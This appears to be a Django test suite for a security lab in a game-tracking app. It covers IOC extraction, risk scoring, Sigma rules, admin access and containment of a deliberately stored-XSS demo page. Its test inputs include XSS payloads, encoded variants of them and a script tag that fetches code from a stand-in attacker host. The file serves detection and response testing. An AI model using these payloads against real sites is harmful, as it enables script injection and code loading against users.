import json
from django.test import TestCase, Client, override_settings
from django.urls import reverse
from django.utils import timezone

from tracker.models import SpyUser, Campaign, Member, SurveillanceRequest
from security_monitoring.models import SecurityLabPayload, SecurityEvent, IOC, SecurityIncident
from security_monitoring.services.extractor import (
    extract_ips, extract_urls, extract_domains, extract_hashes,
    extract_payload_patterns, inspect_user_agent, extract_all_iocs
)
from security_monitoring.services.normalizer import (
    normalize_ip, normalize_domain, normalize_url, normalize_hash,
    normalize_and_deduplicate, normalize_for_inspection
)
from security_monitoring.services.detector import inspect_request, evaluate_string_for_threats
from security_monitoring.services.enrichment import enrich_indicator
from security_monitoring.services.scoring import calculate_risk_score
from security_monitoring.services.sigma import load_all_rules, evaluate_sigma_rules
from security_monitoring.services.parser import process_security_telemetry
from security_monitoring.services.response import take_action_contain, reset_security_lab, verify_active_rendering_state



class IOCTestCase(TestCase):
    def test_ipv4_extraction_and_rejection(self):
        sample = "Target reached from 192.168.1.50 and 203.0.113.50, but 999.999.999.999 and 1.2.3.400 are invalid."
        ips = extract_ips(sample)
        self.assertIn("192.168.1.50", ips)
        self.assertIn("203.0.113.50", ips)
        self.assertNotIn("999.999.999.999", ips)
        self.assertNotIn("1.2.3.400", ips)

    def test_url_and_domain_extraction(self):
        sample = "Payload loaded from https://malicious-payload.demo/exploit.js?v=2 and HTTP://EVIL-CDN.EXAMPLE.ORG:80/payload"
        urls = extract_urls(sample)
        self.assertEqual(len(urls), 2)
        
        domains = extract_domains(sample)
        self.assertIn("malicious-payload.demo", domains)
        self.assertIn("evil-cdn.example.org", [d.lower() for d in domains])

    def test_hash_extraction(self):
        sample = "MD5: 5d41402abc4b2a76b9719d911017c592 and SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        hashes = extract_hashes(sample)
        hash_types = [h["hash_type"] for h in hashes]
        hash_values = [h["value"] for h in hashes]
        self.assertIn("MD5", hash_types)
        self.assertIn("SHA256", hash_types)
        self.assertIn("5d41402abc4b2a76b9719d911017c592", hash_values)
        self.assertIn("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", hash_values)

    def test_normalization_and_deduplication(self):
        raw_list = [
            {"ioc_type": "DOMAIN", "value": "EXAMPLE.COM."},
            {"ioc_type": "DOMAIN", "value": "example.com"},
            {"ioc_type": "URL", "value": "HTTP://EXAMPLE.COM:80/path//to/file?a=1#frag"},
            {"ioc_type": "URL", "value": "http://example.com/path/to/file?a=1"},
            {"ioc_type": "IP", "value": " 203.0.113.50 "},
            {"ioc_type": "IP", "value": "203.0.113.50"},
            {"ioc_type": "HASH", "value": "5D41402ABC4B2A76B9719D911017C592"},
            {"ioc_type": "HASH", "value": "5d41402abc4b2a76b9719d911017c592"},
        ]
        deduped = normalize_and_deduplicate(raw_list)
        # Should deduplicate down to 4 items: 1 domain, 1 url, 1 ip, 1 hash
        types = [d["ioc_type"] for d in deduped]
        self.assertEqual(types.count("DOMAIN"), 1)
        self.assertEqual(types.count("URL"), 1)
        self.assertEqual(types.count("IP"), 1)
        self.assertEqual(types.count("HASH"), 1)

    def test_enrichment_known_and_unknown(self):
        # Known demo malicious IP
        known = enrich_indicator("IP", "203.0.113.50")
        self.assertEqual(known["reputation"], "MALICIOUS")
        self.assertGreaterEqual(known["confidence"], 90)
        self.assertEqual(known["enrichment"]["status"], "Enriched")

        # Unknown IP
        unknown = enrich_indicator("IP", "192.0.2.1")
        self.assertEqual(unknown["reputation"], "UNKNOWN")
        self.assertLessEqual(unknown["confidence"], 20)


class ScoringAndSigmaTestCase(TestCase):
    def test_risk_scoring_boundaries_and_rules(self):
        # Clean benign input
        score_clean, sev_clean, _ = calculate_risk_score(
            payload_text="benign input",
            enriched_iocs=[],
            user_agent="Mozilla/5.0"
        )
        self.assertEqual(score_clean, 0)
        self.assertEqual(sev_clean, "LOW")

        # Malicious demo payload
        iocs = [
            {"ioc_type": "PAYLOAD_PATTERN", "normalized_value": "DEMO_VIDEO_PAYLOAD", "reputation": "MALICIOUS"},
            {"ioc_type": "IP", "normalized_value": "203.0.113.50", "reputation": "MALICIOUS"},
        ]
        score_high, sev_high, breakdown = calculate_risk_score(
            payload_text="<script>/* DEMO_VIDEO_PAYLOAD */</script>",
            enriched_iocs=iocs,
            user_agent="python-requests/2.28 (xss-scanner)",
            event_count_recent=2
        )
        self.assertGreaterEqual(score_high, 80)
        self.assertEqual(sev_high, "CRITICAL")
        self.assertTrue(any("Stored-XSS" in b["rule"] for b in breakdown))
        self.assertTrue(any("Correlated Malicious Indicators" in b["rule"] for b in breakdown))

    def test_sigma_rules_loading_and_matching(self):
        rules = load_all_rules()
        self.assertGreaterEqual(len(rules), 1)

        primary_rule = None
        for r in rules:
            if "Stored XSS Detection" in r.get("title", ""):
                primary_rule = r
                break
        self.assertIsNotNone(primary_rule)
        self.assertIn("detection", primary_rule)
        self.assertIn("level", primary_rule)
        self.assertIn("id", primary_rule)

        # Test event matching
        demo_event = {
            "event_type": "stored_xss_detected",
            "method": "POST",
            "path": "/dispatch/",
            "user_agent": "ThreatLens-Scanner",
            "source_ip": "203.0.113.50"
        }
        matches = evaluate_sigma_rules(demo_event)
        self.assertGreaterEqual(len(matches), 1)
        self.assertEqual(matches[0]["title"], "Stored XSS Detection")


class SecurityLabWorkflowTestCase(TestCase):
    def setUp(self):
        self.client = Client()
        self.admin_user = SpyUser.objects.create(
            player_id=1001,
            player_name="LeadAnalyst",
            api_key="test_api_key_admin",
            is_admin=True
        )
        self.normal_user = SpyUser.objects.create(
            player_id=2002,
            player_name="StandardOperative",
            api_key="test_api_key_user",
            is_admin=False
        )

    def test_security_lab_disabled_flag(self):
        with override_settings(SECURITY_MONITORING_ENABLED=False):
            response = self.client.get(reverse("xss_demo"))
            self.assertEqual(response.status_code, 404)

            response_soc = self.client.get(reverse("soc_dashboard"))
            self.assertEqual(response_soc.status_code, 404)

    def test_admin_authorization_for_soc(self):
        # 1. Unauthenticated -> redirects to login
        response = self.client.get(reverse("soc_dashboard"))
        self.assertEqual(response.status_code, 302)
        self.assertIn(reverse("login"), response.url)

        # 2. Authenticated as non-admin -> 403 Forbidden
        session = self.client.session
        session["spy_user_id"] = self.normal_user.id
        session.save()
        response_non_admin = self.client.get(reverse("soc_dashboard"))
        self.assertEqual(response_non_admin.status_code, 403)

        # 3. Authenticated as admin -> 200 OK
        session["spy_user_id"] = self.admin_user.id
        session.save()
        response_admin = self.client.get(reverse("soc_dashboard"))
        self.assertEqual(response_admin.status_code, 200)


    def test_shared_rendering_and_containment_across_sessions(self):
        client_a = Client()
        client_b = Client()

        # Step 1: Initial clean state
        resp_a1 = client_a.get(reverse("xss_demo"))
        self.assertEqual(resp_a1.status_code, 200)
        self.assertFalse(resp_a1.context["has_active_payload"])
        self.assertNotContains(resp_a1, "fbi-breaking-door.gif")

        # Step 2: Attacker launches controlled attack
        attack_resp = client_a.post(
            reverse("xss_demo"),
            {
                "payload": "<script>/* DEMO_VIDEO_PAYLOAD */ fetch('http://malicious-payload.demo/exploit.js');</script>",
            }
        )
        self.assertEqual(attack_resp.status_code, 302)

        # Step 3: Verify shared rendering impact for both sessions
        resp_a2 = client_a.get(reverse("xss_demo"))
        self.assertTrue(resp_a2.context["has_active_payload"])
        self.assertContains(resp_a2, "fbi-breaking-door.gif")

        resp_b2 = client_b.get(reverse("xss_demo"))
        self.assertTrue(resp_b2.context["has_active_payload"])
        self.assertContains(resp_b2, "fbi-breaking-door.gif")

        # Step 4: Verify incident created in SOC
        incident = SecurityIncident.objects.filter(status="OPEN").latest("created_at")
        self.assertEqual(incident.source_ip, "127.0.0.1")
        self.assertGreaterEqual(incident.risk_score, 80)
        self.assertEqual(incident.matched_sigma_rule, "Stored XSS Detection")

        # Step 5: Analyst executes TAKE ACTION containment
        session = client_a.session
        session["spy_user_id"] = self.admin_user.id
        session.save()

        contain_resp = client_a.post(
            reverse("take_action", kwargs={"incident_id": incident.id})
        )
        self.assertEqual(contain_resp.status_code, 302)

        # Step 6: Verify containment state
        incident.refresh_from_db()
        self.assertEqual(incident.status, "CONTAINED")
        self.assertTrue(incident.containment_verified)
        self.assertIsNotNone(incident.action_taken_at)
        self.assertEqual(SecurityLabPayload.objects.count(), 0)
        # The incident remains and retains the captured payload as forensic evidence.
        self.assertIn("<script>", incident.payload)

        # Step 7: Verify malicious overlay is gone for all sessions
        resp_a3 = client_a.get(reverse("xss_demo"))
        self.assertFalse(resp_a3.context["has_active_payload"])
        self.assertNotContains(resp_a3, "fbi-breaking-door.gif")

        resp_b3 = client_b.get(reverse("xss_demo"))
        self.assertFalse(resp_b3.context["has_active_payload"])
        self.assertNotContains(resp_b3, "fbi-breaking-door.gif")

        # Step 8: Idempotency of TAKE ACTION
        second_action = take_action_contain(incident.id, self.admin_user)
        self.assertTrue(second_action["success"])
        self.assertTrue(second_action.get("idempotent"))

    def test_reset_lab_preserves_torn_data(self):
        # Create existing Torn data
        campaign = Campaign.objects.create(
            faction_id=5555,
            faction_name="Alpha Faction",
            owner=self.admin_user,
            active=True
        )
        member = Member.objects.create(
            campaign=campaign,
            player_id=9999,
            name="TargetPlayer"
        )
        request_rec = SurveillanceRequest.objects.create(
            user=self.normal_user,
            faction_id="5555",
            status="PENDING"
        )

        # Create security demo records
        payload = SecurityLabPayload.objects.create(
            payload="DEMO_VIDEO_PAYLOAD",
            status="ACTIVE"
        )
        event = SecurityEvent.objects.create(
            event_type="stored_xss_detected",
            source_ip="203.0.113.50"
        )
        ioc = IOC.objects.create(
            value="203.0.113.50",
            ioc_type="IP",
            source_event=event,
            normalized_value="203.0.113.50"
        )
        incident = SecurityIncident.objects.create(
            title="Demo Incident",
            severity="HIGH",
            status="OPEN",
            event=event
        )

        # Execute Reset
        reset_security_lab()

        # Security lab records should be wiped
        self.assertEqual(SecurityIncident.objects.count(), 0)
        self.assertEqual(IOC.objects.count(), 0)
        self.assertEqual(SecurityEvent.objects.count(), 0)
        self.assertEqual(SecurityLabPayload.objects.count(), 0)

        # Existing Torn data must be 100% untouched!
        self.assertEqual(SpyUser.objects.count(), 2)
        self.assertEqual(Campaign.objects.count(), 1)
        self.assertEqual(Member.objects.count(), 1)
        self.assertEqual(SurveillanceRequest.objects.count(), 1)


class AutomaticThreatDetectionTestCase(TestCase):
    def setUp(self):
        self.client = Client()
        self.admin = SpyUser.objects.create(
            player_id=5001,
            player_name="SOCAdmin",
            api_key="admin_key",
            is_admin=True
        )

    def test_security_normalization_stages(self):
        # 1. Multi-pass URL decoding
        multi_encoded = "%253Cscript%253E"
        norm1 = normalize_for_inspection(multi_encoded)
        self.assertIn("<script>", norm1)

        # 2. HTML entity unescaping
        html_entities = "&lt;img src=x onerror=alert(1)&gt;"
        norm2 = normalize_for_inspection(html_entities)
        self.assertIn("<img src=x onerror=alert(1)>", norm2)

        # 3. Unicode and Hex escapes
        escaped_input = r"\u003cscript\u003ealert('test')\x3c/script\x3e"
        norm3 = normalize_for_inspection(escaped_input)
        self.assertIn("<script>", norm3)
        self.assertIn("</script>", norm3)

        # 4. Mixed case normalization
        mixed = "<ScRiPt OnLoAd=AlErT(1)>"
        norm4 = normalize_for_inspection(mixed)
        self.assertEqual(norm4, "<script onload=alert(1)>")

    def test_automatic_detection_on_normal_field_names(self):
        # Test attack submitted through 'directive' (no 'payload' field)
        resp = self.client.post(
            reverse("xss_demo"),
            {"directive": "<img src=x onerror=alert('xss')>", "callsign": "TARGET_A"}
        )
        self.assertEqual(resp.status_code, 302)

        # Verify incident automatically created
        incident = SecurityIncident.objects.latest("created_at")
        self.assertEqual(incident.status, "OPEN")
        self.assertIn("onerror=", incident.payload)
        self.assertGreaterEqual(incident.risk_score, 50)
        self.assertEqual(incident.matched_sigma_rule, "Stored XSS Detection")

        # Verify timeline milestones recorded
        timeline = incident.event.raw_event.get("timeline", {})
        self.assertIn("request_received", timeline)
        self.assertIn("detection_triggered", timeline)
        self.assertIn("incident_created", timeline)

    def test_clean_request_does_not_create_incident(self):
        # Clean business directive
        initial_incident_count = SecurityIncident.objects.count()
        resp = self.client.post(
            reverse("xss_demo"),
            {"directive": "Regular sector check completed. Sector is quiet.", "callsign": "PATROL_ALPHA"}
        )
        self.assertEqual(resp.status_code, 302)
        self.assertEqual(SecurityIncident.objects.count(), initial_incident_count)
        self.assertFalse(SecurityLabPayload.objects.filter(status="ACTIVE").exists())

    def test_soc_polling_endpoint(self):
        # Authenticate admin
        session = self.client.session
        session["spy_user_id"] = self.admin.id
        session.save()

        # Generate incident via normal endpoint
        self.client.post(
            reverse("xss_demo"),
            {"notes": "<svg/onload=alert('threat')>"}
        )

        # Poll endpoint
        poll_resp = self.client.get(reverse("soc_poll"))
        self.assertEqual(poll_resp.status_code, 200)
        data = poll_resp.json()
        self.assertEqual(data["status"], "ok")
        self.assertGreater(data["latest_incident_id"], 0)
        self.assertEqual(data["total_open"], 1)
        self.assertEqual(data["active_payload_count"], 1)
        self.assertTrue(data["is_compromised"])

        # Poll endpoint when no open incidents exist (tests fallback to latest_any)
        inc = SecurityIncident.objects.latest("created_at")
        inc.status = "CONTAINED"
        inc.save()
        poll_resp2 = self.client.get(reverse("soc_poll"))
        self.assertEqual(poll_resp2.status_code, 200)
        data2 = poll_resp2.json()
        self.assertEqual(data2["total_open"], 0)
        self.assertEqual(data2["latest_incident_id"], inc.id)

    def test_containment_verification_and_persistence(self):
        # 1. Trigger incident
        self.client.post(
            reverse("xss_demo"),
            {"directive": "<script>/* DEMO_VIDEO_PAYLOAD */ alert('eval')</script>"}
        )
        incident = SecurityIncident.objects.latest("created_at")
        self.assertEqual(SecurityLabPayload.objects.filter(status="ACTIVE").count(), 1)

        # 2. Authenticate admin and contain
        session = self.client.session
        session["spy_user_id"] = self.admin.id
        session.save()

        action_resp = self.client.post(
            reverse("take_action", kwargs={"incident_id": incident.id})
        )
        self.assertEqual(action_resp.status_code, 302)

        # 3. Verify containment result
        incident.refresh_from_db()
        self.assertEqual(incident.status, "CONTAINED")
        self.assertTrue(incident.containment_verified)
        self.assertIn("Payload active: NO", incident.action_result)
        self.assertIn("Active rendering record: NOT FOUND", incident.action_result)
        self.assertIn("Containment: VERIFIED", incident.action_result)

        # 4. Forensic evidence preserved
        self.assertIn("<script>", incident.payload)
        self.assertIsNotNone(incident.event)
        self.assertEqual(SecurityLabPayload.objects.filter(status="ACTIVE").count(), 0)

    def test_surveillance_request_payload_active_until_deleted(self):
        """
        Verifies that a payload submitted into SurveillanceRequest remains ACTIVE
        in the UI / database monitor until the request is deleted via TAKE ACTION.
        """
        # Create a legitimate numeric request that must NEVER be deleted
        legit_req = SurveillanceRequest.objects.create(
            user=self.admin,
            faction_id="54815",
            status="PENDING"
        )

        # Authenticate operative
        session = self.client.session
        session["spy_user_id"] = self.admin.id
        session.save()

        # Submit attack through surveillance request creation form
        malicious_vector = "<script>/* DEMO_VIDEO_PAYLOAD */ alert('surveillance_vector')</script>"
        resp = self.client.post(
            reverse("create_request"),
            {"faction_id": malicious_vector}
        )
        self.assertEqual(resp.status_code, 302)

        # Verify SurveillanceRequest was stored in database
        malicious_req = SurveillanceRequest.objects.filter(faction_id__contains="surveillance_vector").first()
        self.assertIsNotNone(malicious_req)

        # Verify incident was automatically created and linked
        incident = SecurityIncident.objects.latest("created_at")
        self.assertEqual(incident.status, "OPEN")
        self.assertIn("surveillance_vector", incident.payload)

        # CRITICAL TEST: Active rendering state MUST report compromised=True
        # because the malicious request is STILL in the database!
        state = verify_active_rendering_state()
        self.assertTrue(state["is_compromised"])
        self.assertGreaterEqual(state["active_surveillance_requests_count"], 1)

        # SOC poll endpoint must also report compromised
        poll_resp = self.client.get(reverse("soc_poll"))
        self.assertEqual(poll_resp.status_code, 200)
        self.assertTrue(poll_resp.json()["is_compromised"])

        # Execute TAKE ACTION containment
        action_resp = self.client.post(
            reverse("take_action", kwargs={"incident_id": incident.id})
        )
        self.assertEqual(action_resp.status_code, 302)

        # Verify malicious SurveillanceRequest has been DELETED from the database
        self.assertFalse(
            SurveillanceRequest.objects.filter(faction_id__contains="surveillance_vector").exists()
        )

        # Verify legitimate numeric request is PRESERVED
        self.assertTrue(
            SurveillanceRequest.objects.filter(id=legit_req.id).exists()
        )

        # Verify state is now CLEAN
        post_state = verify_active_rendering_state()
        self.assertFalse(post_state["is_compromised"])
        self.assertEqual(post_state["active_surveillance_requests_count"], 0)

        # Verify incident containment result
        incident.refresh_from_db()
        self.assertEqual(incident.status, "CONTAINED")
        self.assertTrue(incident.containment_verified)
        self.assertIn("Payload active: NO", incident.action_result)
        self.assertIn("Active rendering record: NOT FOUND", incident.action_result)
        self.assertIn("Containment: VERIFIED", incident.action_result)
        self.assertIn("SurveillanceRequest", incident.action_result)

        # Forensic evidence remains retained on incident
        self.assertIn("surveillance_vector", incident.payload)

